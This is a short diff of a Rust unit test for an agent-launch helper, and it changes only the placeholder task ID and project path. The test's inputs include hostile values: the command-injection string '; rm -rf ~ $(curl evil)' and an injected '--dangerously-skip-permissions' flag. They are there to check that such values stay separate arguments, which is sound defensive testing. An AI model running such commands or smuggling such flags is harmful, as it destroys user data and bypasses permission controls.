@@ -70,9 +70,9 @@ mod tests {
     fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
         let launch = AgentLaunch {
             agent: Agent::Claude,
-            task_id: TaskId::try_new("PWF-0038").unwrap(),
+            task_id: TaskId::try_new("FOO-0001").unwrap(),
             title: SessionThreadTitle::new("--dangerously-skip-permissions".to_string()),
-            project_path: SessionWorkingDirectory::new("/projects/pwf".to_string()),
+            project_path: SessionWorkingDirectory::new("/projects/foo".to_string()),
             prompt: LaunchPrompt::new(
                 "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
             ),
